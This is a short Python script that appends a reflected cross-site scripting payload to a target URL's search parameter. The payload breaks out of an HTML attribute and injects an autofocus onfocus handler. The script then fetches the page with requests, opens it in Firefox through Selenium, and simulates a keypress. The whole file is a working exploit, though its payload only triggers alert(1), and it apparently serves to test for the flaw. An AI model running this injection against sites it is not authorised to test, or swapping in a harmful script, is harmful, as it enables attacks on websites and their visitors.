import sys
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import pyautogui
import time

def main():
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        sys.exit(1)
    
    base_url = sys.argv[1]
    modified_url = base_url + '/?search=" onfocus="alert(1)" autofocus="'
    
    try:
        response = requests.get(modified_url)
        print(f"Modified URL: {modified_url}")
        print(f"Status code: {response.status_code}")

        driver = webdriver.Firefox()
        driver.get(modified_url)

        time.sleep(5)

        pyautogui.press('enter')

        time.sleep(10)
        driver.quit()
        
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return

if __name__ == "__main__":
    main()
